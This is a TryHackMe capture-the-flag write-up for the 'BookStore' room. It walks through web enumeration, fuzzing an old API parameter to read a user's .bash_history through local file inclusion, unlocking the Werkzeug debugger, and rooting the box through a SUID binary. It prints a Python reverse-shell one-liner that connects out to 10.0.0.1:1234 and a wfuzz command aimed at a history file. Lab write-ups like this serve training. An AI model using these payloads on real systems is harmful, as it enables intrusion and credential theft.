---                                                                                                                                    
title: "BookStore"                                                                                                                         
categories:                                                                                                                            
 - tryhackme                                                                                                                          
tags:                                                                                                                                  
 - linux                                                                                                                               
 - medium                                                                                                                                
 - writeups                                                                                                                            
author_profile: true                                                                                                                   
--- 

A Beginner level box with basic web enumeration and REST API Fuzzing.

**Room**: *https://tryhackme.com/room/bookstoreoc*

> nmap

ssh & http are only open

> web enumeration

- /assets/js/api.js

```javascript
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;
    }
async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```
- ip:5000

```
Foxy REST API v2.0

This is a REST API for science fiction novels.
```

- ip:5000/console

`Werkzeug  Debugger` but pin locked.

- ip:5000/api

```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

- /login.html

```
.....
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

Combining all this above information we know we can get a RCE from debugger if we get the pin-code by using LFI in older version of api.

> API Fuzzing

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt -u http://ip/v1/resources/books?FUZZ=.bash_history
```

> RCE

After getting the pin we can run reverse shell on console to get a rce.
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

> User Enumeration

- found user.txt
- a suid executable `try-harder` 

Download the executable and open it with `ghidra`, we can get the passcode by xor calculation.

> Root

Enter above found passcode into executable input prompt and we are 
**rooted**


